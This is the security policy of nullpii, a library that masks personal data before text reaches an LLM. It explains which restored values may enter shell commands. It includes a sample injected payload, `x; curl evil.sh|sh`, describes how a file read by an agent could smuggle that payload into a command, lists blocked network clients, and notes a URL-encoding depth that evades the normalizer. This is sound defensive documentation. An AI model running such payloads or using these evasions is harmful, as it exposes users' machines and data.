# Security

## Report a vulnerability

Privately — open a [Security Advisory](https://github.com/lBroth/nullpii/security/advisories/new). This is a hobby project — best-effort response, no SLA. Critical / actively-exploited issues get priority.

## What nullpii protects

- Detection runs locally: nullpii sends your text nowhere. Its one network call is the model download from Hugging Face on first use, at a pinned revision whose files are checked by SHA-256; set `NULLPII_MODEL_DIR` to a pre-fetched copy to avoid even that.
- Vault is in-memory only; `destroySession()` purges it.
- Logs carry counts, labels and short ids, never a value nullpii masked or restored: the library's `debug` output, and the gateway's request log and console summary (an upstream error is logged by its status, length and error type, not its body).
- **Except the gateway's `NULLPII_LOG_TRAFFIC=wire`,** a debugging dump to stdout of each request as forwarded and of each upstream response before restore. Placeholders stay masked in it, but everything else is printed as it was sent or written: values the detector missed, fields the gateway forwards unscanned (images, documents, `mcp_servers` with its credentials) and the model's output. Auth headers appear as their last six characters and length. Keep such a dump local and short-lived.
- Placeholders carry a 16-hex prefix of the minting session id (64-bit collision-resistant). `restore()` surfaces foreign-prefix placeholders via `RestoreResult.foreignPlaceholders`; `{ strict: true }` throws `SessionMismatchError` instead.

## What it does NOT protect

- Detector misses (no model is 100% accurate).
- LLMs emitting PII they already knew independently.
- Logging / caching / telemetry running **before** `sanitize()`.
- Adversarial prompts asking the LLM to reveal mappings.

## Known limitations / accepted trade-offs

- **PUA sentinel collision (placeholder escape).** `sanitize()` escapes literal `{{` in input to a Private Use Area codepoint pair (U+E000 U+E001) so user-typed Mustache braces don't collide with PII placeholders during the LLM round-trip. If your input legitimately contains that PUA pair, it will collapse to `{{` on the way out. PUA codepoints are unallocated to standard glyphs and effectively never appear in natural text or LLM output, but the trade-off is documented for completeness.
- **URL %XX decode depth cap.** The adversarial-input normalizer iterates URL `%XX` decoding at most twice per position. Two rounds collapses `%2540` → `%40` → `@` (the practical bypass); 3+ chained encodings (`%252540` etc.) defeat the normalizer and rely on the ML model alone for detection.

## Restoring values into commands

Masking hides a value from the model, so the model cannot judge it. Suppose a file the agent reads contains `x; curl evil.sh|sh`, nullpii masks it as a secret, and the model copies the placeholder into a shell command. Restoring the real value there would run the payload: masking would have made it invisible.

- **The Claude Code mod** refuses the call, naming the placeholder.
- **The gateway** (Anthropic and OpenAI routes, and the sidecar API's `restore` with a shell `tool`) leaves that placeholder masked.

The rule covers every tool a shell runs, under each agent's name: `Bash` (Claude Code), `bash` (Anthropic's bash tool) and `shell` (OpenAI-style agents such as Codex).

**A command that sends data out keeps every placeholder,** whatever the value: a network client (`curl`, `wget`, `nc`, `ssh`, `scp`, `rsync`, `gh`, `dig`, `ping`, `mail`, `aws`, `kubectl`, …), an upload or a fetch (`git push`, `git clone`, `git fetch`, `docker push`, `npm publish`, …), `/dev/tcp`, any of them behind `sudo`, `env`, `timeout` or a path, and code run by an interpreter that opens a URL or a socket. The tool runs on this machine, but a restored value would leave through it.

Otherwise, two rules hold everywhere, because no list names every program that reads its input again as code (a here-string fed to `python3`, `watch "…"`, a script the same command writes and then runs):

- **The value must be inert:** no quote, backslash, `$`, backtick, `;`, `&`, `|`, `<`, `>`, parenthesis, brace, line break or other control character. Such a value cannot end the string it lands in or start a command, in the shell or in any program the shell hands it to.
- **No word of it may read as an option** (`-rf`, `--upload-pack=…`), a comment (`#`) or a home directory (`~`) once a shell splits it.

Then the position decides:

| Position | What the value may contain |
|---|---|
| Anywhere in a command that runs an interpreter or a program that evaluates its arguments (`bash`, `sh`, `python3`, `node`, `perl`, `ruby`, `php`, `awk`, `sed`, `eval`, `source`, `xargs`, `watch`, `make`, …, by name, by path or behind `sudo`, `env`, `nohup`, `timeout`), a program named by an expansion (`$PY`), or code handed on inside an argument (`docker run img sh -c "…"`) | One plain word: letters, digits and `@%+=:,./_-` |
| Unquoted, or inside a command substitution (`$(…)`, backticks) | One plain word |
| Single quotes, `$'…'` | Inert |
| Double quotes | Inert, and no `!` |
| Heredoc body that `cat` or `tee` writes out, in a command that runs nothing but `cat`, `tee`, `echo`, `printf`, `mkdir`, `cd`, `touch`, `ls`, `pwd`, `true` or `git commit`, each by name | Literal body (`<<'EOF'`): no line break. Bare delimiter (`<<EOF`): no line break, `$`, backtick or backslash |
| Such a body in a command that runs anything else | Inert, and no `!` |
| Heredoc body fed to anything else, piped on, without its closing line, or in a command that runs a program by path (`./run.sh`, `/usr/bin/cat`) or makes a file executable (`chmod`) | One plain word |
| A `#` comment | Its quotes and heredoc markers are ignored, so they cannot change the position of what follows |

So a name like `Mary Ann` comes back in quotes, and a name with an apostrophe (`D'Amico`) comes back only in a heredoc body written out as data, such as Claude Code's usual commit form `git commit -m "$(cat <<'EOF' … EOF)"`.

A `command` sent as an argv array (`["bash", "-lc", "…"]`, as Codex does) runs without a shell, so each argument is taken literally and needs only to be inert. The exceptions are a program that runs code, however it is named (every argument: one plain word), a value that would be the program itself, and one that would start an argument with `-` and be read as an option.

The lists of interpreters and network clients are best effort: no list names every program that runs code or every way out of the machine. The inert rule does not depend on them.

**A limit by design.** `Write`, `Edit` and the other file tools get real values back whenever they are in `restoreTools`, as they are by default, since writing your data to your files is what they are for. A later command can still run such a file (`bash run.sh` after `Write run.sh`); the rule judges each call on its own and does not follow what a file holds.

If you call `restore()` yourself and pass the result to a shell, an interpreter, a query or a template, apply the same care. A restored value is data you did not show the model, and it can come from content an attacker controls.

## Detection is not a guarantee

nullpii lowers the amount of personal data and secrets that leave the machine. It does not bring it to zero. It is **pseudonymization with a measurable leak rate**, not anonymization. The residual risk depends on the data:
- the README's Benchmark section and `packages/eval/METHOD.md` report it on public datasets;
- measure it on content like yours before you rely on it.

Treat a sanitized prompt as lower-risk, not as free of personal data.

## CI-enforced rules

- Apache-2.0 / MIT / BSD / ISC / CC0 deps only.
- npm releases use `--provenance`.
- File paths sandboxed to a cache root (`InvalidPathError` on traversal).

## Supply chain and leak gates

`.github/workflows/security.yml` runs on every PR and every push to `main`:

| Gate | What it blocks |
|---|---|
| gitleaks (`.gitleaks.toml`) | Secrets in the commits a change adds, and in the tree. Fake fixtures are allowed by exact value only. |
| Repo hygiene (`scripts/check-repo-hygiene.mjs`) | Private research notes, benchmark outputs, model weights, key material, `.env` files, files over 5 MB, absolute home paths, private package registries |
| CodeQL (`security-extended`) | Static-analysis findings in the TypeScript and the Python eval kit |
| Dependency review | New dependencies with a high-severity advisory or a licence outside the allowlist |

The same secret and hygiene checks run locally through `lefthook`. Every workflow pins its actions and container images by digest, and Dependabot keeps the pins current. CI tokens default to read-only.

Test fixtures follow the reserved-value policy in [CONTRIBUTING.md](https://github.com/lBroth/nullpii/blob/main/CONTRIBUTING.md#test-data).
